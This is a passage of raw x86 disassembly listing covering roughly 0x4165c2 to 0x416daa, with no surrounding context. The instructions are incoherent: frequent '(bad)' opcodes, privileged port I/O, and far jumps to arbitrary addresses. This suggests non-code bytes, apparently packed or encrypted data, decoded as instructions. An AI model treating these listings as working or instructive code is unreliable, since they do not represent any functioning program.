  4165c2:	jp     0x416620
  4165c4:	xlat   BYTE PTR ds:[ebx]
  4165c5:	mov    ah,0xe8
  4165c7:	dec    ebp
  4165c8:	lods   eax,DWORD PTR ds:[esi]
  4165c9:	ficomp WORD PTR [ebx*2+0x2db54301]
  4165d0:	mov    bl,BYTE PTR [edx]
  4165d2:	pusha  
  4165d3:	outs   dx,DWORD PTR ds:[esi]
  4165d4:	bound  esp,QWORD PTR [eax]
  4165d6:	in     eax,dx
  4165d7:	jle    0x4165f8
  4165d9:	cmc    
  4165da:	gs xchg esi,eax
  4165dc:	aaa    
  4165dd:	xor    DWORD PTR [esi+0x26f14a69],eax
  4165e3:	std    
  4165e4:	xchg   ebx,eax
  4165e5:	cmc    
  4165e6:	push   eax
  4165e7:	test   eax,0xae082b8d
  4165ec:	sub    bl,ch
  4165ee:	add    eax,0xf471b01d
  4165f3:	jl     0x416575
  4165f5:	mov    edx,0x74414c37
  4165fa:	push   esp
  4165fb:	push   esp
  4165fc:	cmp    BYTE PTR [ebx+0x6d],al
  4165ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416600:	and    BYTE PTR [ebx-0x680936a],0x57
  416607:	dec    esi
  416608:	in     eax,0xe1
  41660a:	sbb    bh,dl
  41660c:	sub    eax,0x67960e4f
  416611:	sub    eax,edx
  416613:	ins    BYTE PTR es:[edi],dx
  416614:	xchg   DWORD PTR ds:0xa4e1332a,eax
  41661a:	outs   dx,BYTE PTR ds:[esi]
  41661b:	adc    BYTE PTR [edi],ah
  41661d:	or     al,0x12
  41661f:	mov    esp,0xaf203491
  416624:	and    ecx,ebp
  416626:	stos   BYTE PTR es:[edi],al
  416627:	push   ds
  416628:	scas   eax,DWORD PTR es:[edi]
  416629:	nop
  41662a:	jbe    0x416642
  41662c:	jae    0x416654
  41662e:	sbb    esi,ebx
  416630:	xor    esp,ebp
  416632:	imul   esp,DWORD PTR [eax-0x45b916e1],0x4377263b
  41663c:	and    ebp,esi
  41663e:	adc    eax,0xf4248ca2
  416643:	mov    al,ds:0x4e75811e
  416648:	cmp    ebp,DWORD PTR [ecx+0xd93757]
  41664e:	adc    dl,BYTE PTR [ebx-0x20]
  416651:	xchg   ebp,eax
  416652:	shr    edx,cl
  416654:	rcl    DWORD PTR [esi],cl
  416656:	es stos DWORD PTR es:[edi],eax
  416658:	and    dl,BYTE PTR [eax+edi*4+0x6b82be95]
  41665f:	mov    dl,0x3b
  416661:	push   cs
  416662:	sub    al,0x2e
  416664:	lea    edi,[esi-0x4742dba2]
  41666a:	lock xchg ebp,eax
  41666c:	mov    al,0x6d
  41666e:	push   esi
  41666f:	cwde   
  416670:	xlat   BYTE PTR ds:[ebx]
  416671:	xor    DWORD PTR [esi-0x13215487],0xffffffeb
  416678:	mov    DWORD PTR [eax-0x2851b8d2],edx
  41667e:	adc    BYTE PTR [ebx],ch
  416680:	dec    ecx
  416682:	ja     0x4166c6
  416684:	pop    ecx
  416685:	ins    DWORD PTR es:[edi],dx
  416686:	mov    BYTE PTR [edx+0x60],dh
  416689:	cli    
  41668a:	(bad)  
  41668b:	call   0xaa5ca831
  416690:	dec    ebp
  416691:	gs push ds
  416693:	pop    eax
  416694:	or     ch,dh
  416696:	jne    0x787750b9
  41669c:	inc    esi
  41669d:	push   esi
  41669e:	mov    esi,esi
  4166a0:	or     bh,dl
  4166a2:	ror    ah,cl
  4166a4:	aaa    
  4166a5:	add    eax,0x819fadc3
  4166aa:	mov    ah,0xf4
  4166ac:	add    BYTE PTR [edx],bh
  4166ae:	sbb    al,0x41
  4166b0:	(bad)  
  4166b2:	test   DWORD PTR [eax],edi
  4166b4:	out    0x3e,eax
  4166b6:	ja     0x41671f
  4166b8:	xchg   ebx,eax
  4166b9:	ret    0xf506
  4166bc:	call   0x3a82:0xba04f907
  4166c3:	cmp    eax,0x1a6b465a
  4166c8:	int    0xbf
  4166ca:	or     ecx,DWORD PTR [ecx-0x7e]
  4166cd:	iret   
  4166ce:	popf   
  4166cf:	rcr    DWORD PTR [ecx+0x71b3a56],cl
  4166d5:	std    
  4166d6:	(bad)  
  4166d7:	jnp    0x416734
  4166d9:	repz mov ah,0x0
  4166dc:	pop    edx
  4166dd:	repnz ror DWORD PTR [ecx+0x64],0x6c
  4166e2:	mov    ds:0xbb18de52,eax
  4166e7:	mov    ebp,esp
  4166e9:	pop    esi
  4166ea:	outs   dx,BYTE PTR ds:[esi]
  4166eb:	pop    ecx
  4166ec:	mov    ch,BYTE PTR [eax+0x6659ffe6]
  4166f2:	pop    es
  4166f3:	sbb    al,0xce
  4166f5:	shl    DWORD PTR [eax-0x66],1
  4166f8:	jne    0x4166c1
  4166fa:	fwait
  4166fb:	mov    dl,0x92
  4166fd:	mov    esi,ebx
  4166ff:	cmp    dl,dl
  416701:	mov    edx,0xc5f38c28
  416706:	inc    esi
  416707:	pop    eax
  416708:	sysenter 
  41670a:	repz in al,0x1b
  41670d:	cwde   
  41670e:	pmuludq mm6,QWORD PTR [edi-0x611cadd1]
  416715:	xor    ah,BYTE PTR [eax-0x31]
  416718:	sub    eax,0x5931b764
  41671d:	cmp    BYTE PTR [eax],bh
  41671f:	lds    edx,FWORD PTR [esi]
  416721:	push   ebx
  416722:	jl     0x41673b
  416724:	or     ch,BYTE PTR [esi+0x7020d267]
  41672a:	inc    edx
  41672b:	mov    ebp,0xd4769fa8
  416730:	push   ss
  416731:	push   ss
  416732:	out    0x36,eax
  416734:	in     al,0x43
  416736:	mov    ds:0x5ea27c44,eax
  41673b:	push   ebp
  41673c:	inc    edx
  41673d:	add    bl,BYTE PTR [edi+0x726804d]
  416743:	and    BYTE PTR [ecx+0x426650d8],ch
  416749:	rcl    BYTE PTR ds:0x7b986a4e,0x3a
  416750:	mov    BYTE PTR [ebx-0x5076bbc8],bl
  416756:	mov    ds:0x346dc200,al
  41675b:	dec    edi
  41675c:	sahf   
  41675d:	mov    ebx,0xdd598436
  416762:	dec    esi
  416763:	sbb    al,cl
  416765:	mov    al,0x95
  416767:	aad    0x9d
  416769:	mov    esi,0xe169311c
  41676e:	mov    ebx,0xb9d37427
  416773:	sub    ah,BYTE PTR [ebx]
  416775:	dec    esi
  416776:	push   edx
  416777:	in     eax,0xe6
  416779:	ins    BYTE PTR es:[edi],dx
  41677a:	xchg   esi,eax
  41677b:	stos   DWORD PTR es:[edi],eax
  41677c:	dec    ecx
  41677d:	call   0x8d709552
  416782:	fmul   DWORD PTR [eax]
  416784:	sub    BYTE PTR [eax-0x79],bh
  416787:	addr16 pop esp
  416789:	jns    0x416770
  41678b:	jne    0x4167c7
  41678d:	sub    eax,0xdba25fc1
  416792:	add    esp,DWORD PTR es:[ebx-0x5b]
  416796:	aam    0xcf
  416798:	test   BYTE PTR [ebx+0x52],cl
  41679b:	scas   eax,DWORD PTR es:[edi]
  41679c:	xchg   ebp,eax
  41679d:	push   esi
  41679e:	and    dh,bl
  4167a0:	ja     0x4167a8
  4167a2:	(bad)  
  4167a3:	js     0x416743
  4167a5:	clc    
  4167a6:	adc    ch,BYTE PTR [esi+0x12]
  4167a9:	mov    ds,WORD PTR [edi+0x5a]
  4167ac:	in     al,0xa3
  4167ae:	sub    al,0x8b
  4167b0:	or     esp,DWORD PTR [edx-0x4221e038]
  4167b6:	mov    esi,0x609d603e
  4167bb:	(bad)  
  4167bc:	jg     0x4167e0
  4167be:	rcl    DWORD PTR [esi+0x3b4dad1c],0x60
  4167c5:	push   eax
  4167c6:	(bad)  
  4167c7:	and    eax,0xd8c8c90f
  4167cc:	add    ecx,DWORD PTR [edx+0x5ef2d155]
  4167d2:	fild   QWORD PTR [eax]
  4167d4:	pusha  
  4167d5:	xchg   edx,eax
  4167d6:	or     eax,0x989a347
  4167db:	ret    
  4167dc:	js     0x416798
  4167de:	or     dh,BYTE PTR [ebx-0x1b5303dd]
  4167e4:	cli    
  4167e5:	aas    
  4167e6:	sbb    DWORD PTR [esi+0x26],esi
  4167e9:	sub    dh,0xa8
  4167ec:	imul   ebx,DWORD PTR [ebx-0x3c5584fe],0x71456538
  4167f6:	ret    0x8aa1
  4167f9:	in     eax,dx
  4167fa:	or     edx,DWORD PTR [edi]
  4167fc:	aas    
  4167fd:	fwait
  4167fe:	sub    eax,0x12ffb065
  416803:	xchg   BYTE PTR [esi-0x4f],dh
  416806:	out    dx,al
  416807:	stc    
  416808:	out    0x64,eax
  41680a:	bound  esp,QWORD PTR [ecx-0x645f2d59]
  416810:	inc    edx
  416811:	dec    esp
  416812:	cmc    
  416813:	fwait
  416814:	xchg   ecx,eax
  416815:	in     eax,dx
  416816:	(bad)  
  416817:	mov    esi,0x18c3023a
  41681c:	pop    ecx
  41681d:	pop    eax
  41681e:	cmp    BYTE PTR [ecx-0x5f],0x91
  416822:	inc    ebp
  416823:	imul   ebp,DWORD PTR ds:0xae98c317,0x94d24a6b
  41682d:	or     eax,0x99cbb2dc
  416832:	dec    ebx
  416833:	jnp    0x4167fe
  416835:	cmp    al,0xd3
  416837:	cld    
  416838:	bound  edx,QWORD PTR [edx+0x7a6b5d2]
  41683e:	ret    
  41683f:	sbb    DWORD PTR [ebx-0x18058cbc],ebx
  416845:	(bad)  
  416846:	fnstenv [ebx]
  416848:	xchg   edx,eax
  416849:	arpl   WORD PTR [ebx+0x2c],si
  41684c:	xor    cl,ah
  41684e:	shl    BYTE PTR ds:[esi-0x58],1
  416852:	pop    es
  416853:	dec    eax
  416854:	mov    esi,0xabfb0d63
  416859:	shr    DWORD PTR [ecx-0x1f],cl
  41685c:	aaa    
  41685d:	adc    edi,edi
  41685f:	lea    eax,[esi+0x7181a25]
  416865:	jns    0x416877
  416867:	jbe    0x416858
  416869:	and    al,0x9
  41686b:	push   ebx
  41686c:	aam    0x81
  41686e:	mov    es,WORD PTR [esi]
  416870:	inc    eax
  416871:	aam    0x49
  416873:	cmc    
  416874:	ss mov ebp,0xaa411966
  41687a:	push   edi
  41687b:	cld    
  41687c:	xchg   ebx,eax
  41687d:	clc    
  41687e:	stc    
  41687f:	or     bh,ch
  416881:	dec    ebx
  416882:	dec    edx
  416883:	loope  0x41686d
  416885:	aad    0x21
  416887:	add    bl,cl
  416889:	lock call 0x116c:0x28a638e7
  416891:	stos   BYTE PTR es:[di],al
  416893:	xor    BYTE PTR [edx-0x33239085],dh
  416899:	xor    eax,0x6e58aa39
  41689e:	cwde   
  41689f:	push   0x67bbf58f
  4168a4:	or     al,0x45
  4168a6:	mov    ds:0x4b5093f9,eax
  4168ab:	ret    
  4168ac:	hlt    
  4168ad:	push   edx
  4168ae:	int3   
  4168af:	sub    dl,ah
  4168b1:	jne    0x41692e
  4168b3:	test   BYTE PTR [edi+0x28efea4c],dl
  4168b9:	push   0xc98c5603
  4168be:	mov    eax,ds:0xd981b4d1
  4168c3:	mov    bl,0x15
  4168c5:	jbe    0x41689a
  4168c7:	sub    BYTE PTR [ebx+edi*4-0x156fa1bb],0x82
  4168cf:	jb     0x41690b
  4168d1:	imul   ebp,DWORD PTR [edi+0x14af6221],0x4c
  4168d8:	imul   esp,DWORD PTR [esi],0xffffffff
  4168db:	jmp    0x54ecba84
  4168e0:	lds    ebp,FWORD PTR [ecx-0x26c4f0a1]
  4168e6:	mov    gs,ebx
  4168e8:	or     al,BYTE PTR [eax+0x4a]
  4168eb:	push   ss
  4168ec:	inc    edi
  4168ed:	mov    dh,0xf3
  4168ef:	in     eax,0xc7
  4168f1:	adc    BYTE PTR [ebp+0x54572c5c],dh
  4168f7:	jle    0x41694c
  4168f9:	sub    BYTE PTR [edi+0x8f6cdc6],cl
  4168ff:	mov    ebx,0x361e2302
  416904:	mov    al,ds:0x39145039
  416909:	shl    DWORD PTR [edi-0x12e5cdf9],1
  41690f:	xchg   esp,eax
  416910:	add    DWORD PTR [edi-0x17],esp
  416913:	test   al,0x4a
  416915:	sub    BYTE PTR [ecx],bl
  416917:	stos   DWORD PTR es:[edi],eax
  416918:	dec    ebp
  416919:	(bad)  
  41691a:	call   0xc9c13b18
  41691f:	sub    eax,0xe07bfcd3
  416924:	mov    fs,WORD PTR [esi]
  416926:	fldcw  WORD PTR [ecx]
  416928:	jle    0x4168e4
  41692a:	cli    
  41692b:	out    dx,al
  41692c:	(bad)  
  41692d:	dec    eax
  41692e:	fdivr  DWORD PTR [ebp+0x343d11d0]
  416934:	mov    ds:0x4ba4e2da,eax
  416939:	aas    
  41693a:	aad    0x65
  41693c:	ds pop ecx
  41693e:	xchg   BYTE PTR [ebx+0x65ff65c0],ah
  416944:	rol    eax,0xff
  416947:	(bad)  
  416948:	mov    bl,0xad
  41694a:	mov    cl,0x6b
  41694c:	inc    edx
  41694d:	cmp    eax,0x8a820ebf
  416952:	mov    dl,0xc2
  416954:	inc    ecx
  416955:	out    dx,eax
  416956:	rcr    BYTE PTR [edi],1
  416958:	leave  
  416959:	icebp  
  41695a:	mov    cl,0xe2
  41695c:	shr    BYTE PTR [eax],0x71
  41695f:	imul   esp,DWORD PTR [ebx-0x3c5471db],0xffffffd8
  416966:	loop   0x416943
  416968:	pop    ecx
  416969:	jns    0x416983
  41696b:	rcl    DWORD PTR [edi-0x2ad8c55c],cl
  416971:	addr16 and eax,0xbdbd5afc
  416977:	mov    ds:0xfda72054,al
  41697c:	clc    
  41697d:	pusha  
  41697e:	cmp    eax,0x7ba7cdf7
  416983:	(bad)  
  416984:	or     BYTE PTR [ebp+0x5d],cl
  416987:	ins    DWORD PTR es:[edi],dx
  416988:	jbe    0x416917
  41698a:	pop    es
  41698b:	dec    eax
  41698c:	cwde   
  41698d:	xor    bl,BYTE PTR [eax]
  41698f:	jae    0x416935
  416991:	jl     0x41695c
  416993:	fstp   TBYTE PTR [ebp-0x735f6241]
  416999:	mov    edx,0x799d4f04
  41699e:	(bad)  
  41699f:	xchg   BYTE PTR cs:[edx+0x7d6cc3a7],ah
  4169a6:	in     eax,0xa7
  4169a8:	cmc    
  4169a9:	inc    eax
  4169aa:	out    0x3,eax
  4169ac:	es push ebp
  4169ae:	mov    eax,ds:0xf08d9f42
  4169b3:	xor    DWORD PTR [eax],esi
  4169b5:	call   0x1391:0xa61cc7d0
  4169bc:	push   ebp
  4169bd:	mov    bl,0xf7
  4169bf:	dec    eax
  4169c0:	dec    edx
  4169c1:	scas   al,BYTE PTR es:[edi]
  4169c2:	aas    
  4169c3:	scas   al,BYTE PTR es:[edi]
  4169c4:	xor    ch,BYTE PTR [eax-0x2a]
  4169c7:	mov    eax,0xf8df4b9b
  4169cc:	lods   eax,DWORD PTR ds:[esi]
  4169cd:	into   
  4169ce:	adc    DWORD PTR [edi],ecx
  4169d0:	cmp    bh,BYTE PTR [esi-0x7ccf3b9e]
  4169d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169d7:	xchg   DWORD PTR [ecx-0x33],esi
  4169da:	jae    0x4169b3
  4169dc:	push   ebp
  4169dd:	jg     0x4169db
  4169df:	fmul   QWORD PTR [edx+edi*2]
  4169e2:	je     0x416a1c
  4169e4:	dec    edi
  4169e5:	xchg   BYTE PTR [edx+0x5d],al
  4169e8:	repnz mov ah,0x9e
  4169eb:	xchg   DWORD PTR [ebx],edi
  4169ed:	push   cs
  4169ee:	(bad)  
  4169ef:	jp     0x416979
  4169f1:	add    eax,0xf3a8f112
  4169f6:	imul   eax,DWORD PTR [ebp-0x5b00eac4],0xffffffb7
  4169fd:	xchg   ecx,eax
  4169fe:	fstp   TBYTE PTR [ebp+0x26296ace]
  416a04:	add    cl,bl
  416a06:	frstor ds:0x4599b84e
  416a0c:	push   ebp
  416a0d:	pop    edi
  416a0e:	mov    BYTE PTR [eax+0x3f2faeee],al
  416a14:	and    al,BYTE PTR [edx-0x78130a2f]
  416a1a:	mov    esp,0x8283a41a
  416a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a20:	aas    
  416a21:	xor    eax,0xca6106e4
  416a26:	mov    ebx,0x6788f84f
  416a2b:	sub    eax,0x5e34090b
  416a30:	in     al,dx
  416a31:	pop    es
  416a32:	push   cs
  416a33:	mov    ecx,cs
  416a35:	push   ss
  416a36:	or     al,0x39
  416a38:	and    BYTE PTR [edx-0x36f64061],ch
  416a3e:	(bad)  
  416a3f:	mov    bl,0x4e
  416a41:	jp     0x4169e0
  416a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a44:	shr    BYTE PTR [ecx+0x78340b39],0x6e
  416a4b:	dec    eax
  416a4c:	stos   DWORD PTR es:[edi],eax
  416a4d:	fistp  WORD PTR [edx-0x39]
  416a50:	(bad)  
  416a51:	or     eax,DWORD PTR [ebx+0x70]
  416a54:	rcl    BYTE PTR [ebx],cl
  416a56:	imul   eax,DWORD PTR [ebx],0xffffff8d
  416a59:	cmp    DWORD PTR [ebx-0x6eccabe],esp
  416a5f:	clc    
  416a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a61:	test   al,0xee
  416a63:	sbb    DWORD PTR [eax+0x602353bf],eax
  416a69:	mov    ecx,0x76fae1f1
  416a6e:	ficom  WORD PTR [eax+0x61e6a161]
  416a74:	pop    edx
  416a75:	xchg   ebx,eax
  416a76:	iret   
  416a77:	sti    
  416a78:	fcomp  QWORD PTR [esp+eax*4+0xb]
  416a7c:	out    dx,al
  416a7d:	inc    esi
  416a7e:	stos   DWORD PTR es:[edi],eax
  416a7f:	pop    ebx
  416a80:	or     cl,BYTE PTR ds:0x7fcdda60
  416a86:	xchg   ebp,eax
  416a87:	popf   
  416a88:	test   eax,0xd132acd
  416a8d:	repz sub eax,0xaf7f71a4
  416a93:	mov    esi,0x84af4f40
  416a98:	repnz cmp ecx,DWORD PTR [eax-0x57b74980]
  416a9f:	xchg   edi,eax
  416aa0:	sbb    edi,DWORD PTR [esi]
  416aa2:	stos   BYTE PTR es:[edi],al
  416aa3:	mov    ecx,0xde97dc3
  416aa8:	xchg   edi,eax
  416aa9:	or     dh,BYTE PTR [edx-0x1218888c]
  416aaf:	xchg   edi,eax
  416ab0:	lods   eax,DWORD PTR ds:[esi]
  416ab1:	scas   eax,DWORD PTR es:[edi]
  416ab2:	icebp  
  416ab3:	push   ebp
  416ab4:	iret   
  416ab5:	adc    bl,BYTE PTR [ebp-0x29]
  416ab8:	rcr    DWORD PTR [ecx],0xa0
  416abb:	mov    ecx,DWORD PTR [edx+0x37f0137e]
  416ac1:	fadd   st,st(4)
  416ac3:	dec    esp
  416ac4:	sub    al,0x5b
  416ac6:	sbb    DWORD PTR [ebx-0x61],ebx
  416ac9:	call   0x6946a1f9
  416ace:	lea    ecx,[ecx+0x3f542b93]
  416ad4:	jne    0x416ad2
  416ad6:	mov    al,ds:0x47292941
  416adb:	loopne 0x416ab5
  416add:	xor    edi,DWORD PTR [ebp-0x42]
  416ae0:	dec    ebx
  416ae1:	int    0x5d
  416ae3:	add    ah,BYTE PTR [edi+esi*8]
  416ae6:	add    DWORD PTR [ecx],edi
  416ae8:	jp     0x416ae1
  416aea:	cmp    DWORD PTR [edx+0x793e5d76],ebp
  416af0:	les    esi,FWORD PTR [ebx-0x41]
  416af3:	add    BYTE PTR ds:0x75aea6ba,ah
  416af9:	bswap  edi
  416afb:	or     eax,0x1d18f413
  416b00:	sbb    bh,bh
  416b02:	popa   
  416b03:	xchg   BYTE PTR [ebp+0x4e],ch
  416b06:	cmp    eax,0x9660bfbd
  416b0b:	mov    esp,0x6c1d455c
  416b10:	out    0x20,eax
  416b12:	add    al,0xd0
  416b14:	outs   dx,DWORD PTR ds:[esi]
  416b15:	es jl  0x416b4f
  416b18:	retf   0x603b
  416b1b:	add    esi,DWORD PTR [edi-0x1f78917b]
  416b21:	int3   
  416b22:	xchg   ecx,eax
  416b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b24:	pop    ds
  416b25:	sub    BYTE PTR [edx-0x294f3a4f],dh
  416b2b:	push   edx
  416b2c:	jbe    0x416ad0
  416b2e:	xor    eax,0x7ab2222e
  416b33:	push   ss
  416b34:	pop    edi
  416b35:	mov    bh,cl
  416b37:	xor    bl,BYTE PTR [eax+0x79]
  416b3a:	inc    esi
  416b3b:	iret   
  416b3c:	imul   edi,DWORD PTR [edx+0x2c],0x48
  416b40:	xlat   BYTE PTR ds:[ebx]
  416b41:	and    dl,bh
  416b43:	pop    eax
  416b44:	ins    DWORD PTR es:[edi],dx
  416b45:	add    al,0xc6
  416b47:	dec    esi
  416b48:	jmp    0x3e4295ca
  416b4d:	in     eax,dx
  416b4e:	mov    eax,ds:0x2bd4c98c
  416b53:	aad    0x82
  416b55:	cmp    al,BYTE PTR [esp+ebx*4+0x2b]
  416b59:	push   esp
  416b5a:	mov    ah,0x1f
  416b5c:	xchg   BYTE PTR [esi],ah
  416b5e:	jp     0x416bc0
  416b60:	push   cs
  416b61:	and    ax,0xefc1
  416b65:	xchg   edi,eax
  416b66:	or     BYTE PTR [edx-0x62],cl
  416b69:	adc    al,0xc7
  416b6b:	lods   eax,DWORD PTR ds:[esi]
  416b6c:	fidivr WORD PTR [ecx+edx*4+0x7d]
  416b70:	mov    ds:0x62fec5ae,al
  416b75:	fwait
  416b76:	add    DWORD PTR [edi-0x5fd0aff1],0xa7481723
  416b80:	data16 je 0x416bce
  416b83:	std    
  416b84:	mov    ss,WORD PTR [edx+0x1ed2cb7d]
  416b8a:	xor    al,0x81
  416b8c:	and    eax,0xf41ff711
  416b91:	cmp    cl,bh
  416b93:	icebp  
  416b94:	cli    
  416b95:	les    esi,FWORD PTR [ebx-0x46]
  416b98:	test   DWORD PTR [ecx+0x69c8f266],0xaaf6f851
  416ba2:	jbe    0x416c11
  416ba4:	push   edi
  416ba5:	inc    ebp
  416ba6:	and    ebx,esp
  416ba8:	gs fmulp st(2),st
  416bab:	add    BYTE PTR [edi],0x41
  416bae:	neg    edi
  416bb0:	retf   
  416bb1:	mov    bh,BYTE PTR [esi+esi*2+0x46]
  416bb5:	cs repz pop ebp
  416bb8:	sti    
  416bb9:	push   ds
  416bba:	pop    edi
  416bbb:	mov    ds:0x2345a690,al
  416bc0:	pop    eax
  416bc1:	imul   ecx,DWORD PTR [esi+0x518a94f2],0xfffffff4
  416bc8:	jmp    0x52245f1d
  416bcd:	jbe    0x416bdc
  416bcf:	jnp    0x416c33
  416bd1:	in     al,dx
  416bd2:	inc    ebx
  416bd3:	dec    eax
  416bd4:	data16 (bad) 
  416bd6:	mov    ebx,0xcffd6f5c
  416bdb:	push   0xffffff9c
  416bdd:	mov    esi,0xda8f0da2
  416be2:	test   BYTE PTR [esi+0x9],0x14
  416be6:	mov    DWORD PTR [ebx+0x61978c21],esi
  416bec:	mov    BYTE PTR [edi+ebx*1],ch
  416bef:	iret   
  416bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf1:	add    DWORD PTR ds:0x64fd1603,edi
  416bf7:	sahf   
  416bf8:	out    0xea,al
  416bfa:	adc    BYTE PTR [ebx-0x11],bl
  416bfd:	pop    DWORD PTR [ecx+0x6b]
  416c00:	jp     0x416bd9
  416c02:	lea    ecx,[ecx+0x3aee38dd]
  416c08:	xor    al,BYTE PTR [ebp+0x58]
  416c0b:	mov    al,ds:0x5cab4956
  416c10:	sub    al,0x26
  416c12:	and    cl,cl
  416c14:	push   edx
  416c15:	lods   eax,DWORD PTR ds:[esi]
  416c16:	jg     0x416c70
  416c18:	test   eax,0x58269ff5
  416c1d:	loope  0x416c97
  416c1f:	mov    fs,WORD PTR [ecx-0x58]
  416c22:	ss ret 
  416c24:	inc    ebp
  416c25:	push   eax
  416c26:	pusha  
  416c27:	shl    BYTE PTR [edi+eax*4+0x5e],cl
  416c2b:	inc    esp
  416c2c:	cmc    
  416c2d:	cmp    bl,0x84
  416c30:	ja     0x416bd3
  416c32:	xchg   ebx,eax
  416c33:	icebp  
  416c34:	lock cs pop ds
  416c37:	xchg   esi,eax
  416c38:	test   BYTE PTR [edx],cl
  416c3a:	xchg   ecx,eax
  416c3b:	pusha  
  416c3c:	iret   
  416c3d:	pop    esp
  416c3e:	or     BYTE PTR [ebp+0x15c7d433],bh
  416c44:	and    ebx,DWORD PTR [esi+0x47]
  416c47:	lea    ecx,[ebx+eiz*4]
  416c4a:	inc    esi
  416c4b:	stos   DWORD PTR es:[edi],eax
  416c4c:	out    dx,eax
  416c4d:	sbb    DWORD PTR [ebx],ecx
  416c4f:	mov    eax,0xc8a3bf3f
  416c54:	out    0xc9,eax
  416c56:	fcos   
  416c58:	(bad)  
  416c59:	push   ebp
  416c5a:	fs stos BYTE PTR es:[edi],al
  416c5c:	jle    0x416ccc
  416c5e:	mov    ebp,0x10be91e
  416c63:	std    
  416c64:	push   eax
  416c65:	sahf   
  416c66:	add    al,0x88
  416c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c69:	loopne 0x416cd6
  416c6b:	add    DWORD PTR [ecx+esi*4-0xe62c900],edi
  416c72:	outs   dx,DWORD PTR ds:[esi]
  416c73:	sar    BYTE PTR [esi-0x5e17096],1
  416c79:	adc    edi,esp
  416c7b:	or     eax,0x72b99cc1
  416c80:	pushf  
  416c81:	pop    ebx
  416c82:	xchg   DWORD PTR [eax+ebx*4-0x2ad7ef44],ebx
  416c89:	(bad)  
  416c8a:	xor    DWORD PTR [esp+ebp*8+0x5ec06c0a],ecx
  416c91:	(bad)  
  416c92:	inc    ecx
  416c93:	icebp  
  416c94:	fstp   DWORD PTR [edi]
  416c96:	push   es
  416c97:	xchg   esi,eax
  416c98:	mov    bl,0x6a
  416c9a:	jo     0x416caa
  416c9c:	(bad)  
  416c9d:	dec    esp
  416c9e:	je     0x416cb9
  416ca0:	push   0x7c
  416ca2:	xchg   esi,eax
  416ca3:	in     al,0xe8
  416ca5:	rol    DWORD PTR [ecx],cl
  416ca7:	fcom   QWORD PTR [ecx-0xb]
  416caa:	ret    
  416cab:	retf   
  416cac:	mov    eax,ds:0x14b8d719
  416cb1:	push   0x40f7e339
  416cb6:	and    ebx,DWORD PTR [ebx+0x1ea42ef7]
  416cbc:	push   cs
  416cbd:	fcomp  DWORD PTR [eax-0x5b]
  416cc0:	push   cs
  416cc1:	xchg   edx,eax
  416cc2:	cmp    esp,DWORD PTR [eax+edx*4-0x7a718329]
  416cc9:	mov    DWORD PTR [edi],ebp
  416ccb:	hlt    
  416ccc:	pop    esi
  416ccd:	leave  
  416cce:	sub    al,BYTE PTR [ecx-0x72]
  416cd1:	out    0x45,al
  416cd3:	fidiv  DWORD PTR [ebx-0x36]
  416cd6:	retf   0xc24c
  416cd9:	cwde   
  416cda:	dec    ebp
  416cdb:	out    0xb8,al
  416cdd:	add    eax,0x56346cd
  416ce2:	(bad)  
  416ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce5:	lock adc al,0x7
  416ce8:	adc    cl,dh
  416cea:	fsubr  QWORD PTR [ebx]
  416cec:	loopne 0x416ce0
  416cee:	or     al,0xba
  416cf0:	sub    eax,0x6fd23fbe
  416cf5:	push   ss
  416cf6:	xor    al,bh
  416cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cf9:	add    eax,0x9814ca6f
  416cfe:	cmp    ebx,DWORD PTR [edi+0x5c4a5055]
  416d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d05:	xchg   esp,eax
  416d06:	aas    
  416d07:	ret    0x1a06
  416d0a:	xchg   BYTE PTR [esi+edx*4],ah
  416d0d:	inc    eax
  416d0e:	adc    bl,al
  416d10:	dec    esp
  416d11:	add    esi,esp
  416d13:	push   ds
  416d14:	aas    
  416d15:	fisubr DWORD PTR [ebx+0x1d]
  416d18:	leave  
  416d19:	cld    
  416d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d1b:	xchg   esp,eax
  416d1c:	xchg   BYTE PTR [ebp-0x1f],cl
  416d1f:	clc    
  416d20:	clc    
  416d21:	dec    edi
  416d22:	mov    eax,0x9abb8c0f
  416d27:	test   eax,0xbea1a487
  416d2c:	or     edx,DWORD PTR [ecx-0x498b6a0a]
  416d32:	adc    ah,BYTE PTR [esp+edx*4-0x6439ff24]
  416d39:	int    0x22
  416d3b:	dec    edi
  416d3c:	test   eax,0x8ee95be3
  416d41:	mov    al,ds:0xd2a4178b
  416d46:	fbld   TBYTE PTR [ebx]
  416d48:	lea    eax,[esi]
  416d4a:	jle    0x416d01
  416d4c:	repz daa 
  416d4e:	dec    ebp
  416d4f:	xor    eax,0x35cb1b4d
  416d54:	enter  0x2a60,0x63
  416d58:	cmp    bl,BYTE PTR [edx]
  416d5a:	in     eax,dx
  416d5b:	jmp    0x416d2e
  416d5d:	xor    BYTE PTR [esi],dh
  416d5f:	sub    eax,0x3ef2005c
  416d64:	lds    ebp,FWORD PTR [edx+0x52]
  416d67:	sbb    al,0x93
  416d69:	ins    DWORD PTR es:[edi],dx
  416d6a:	xlat   BYTE PTR ds:[ebx]
  416d6b:	div    BYTE PTR [ebx+0x1cc109e7]
  416d71:	jmp    0x46772e4
  416d76:	test   eax,0x2e09cc3b
  416d7b:	das    
  416d7c:	ret    0xde9e
  416d7f:	std    
  416d80:	add    DWORD PTR [ebx-0x2d],esp
  416d83:	out    0x74,al
  416d85:	mov    WORD PTR [edi-0x14c7ec56],cs
  416d8b:	(bad)  
  416d8c:	jg     0x416deb
  416d8e:	jno    0x416d40
  416d90:	js     0x416d15
  416d92:	pop    ds
  416d93:	pop    ss
  416d94:	pop    eax
  416d95:	jmp    0xc468:0x44ad79fa
  416d9c:	jb     0x416d84
  416d9e:	jnp    0x416d66
  416da0:	mov    esi,es
  416da2:	fs in  al,0x3d
  416da5:	add    al,0x97
  416da7:	xchg   esp,eax
  416da8:	add    al,0xe0
  416daa:	mov    ss,WORD PTR [ecx]
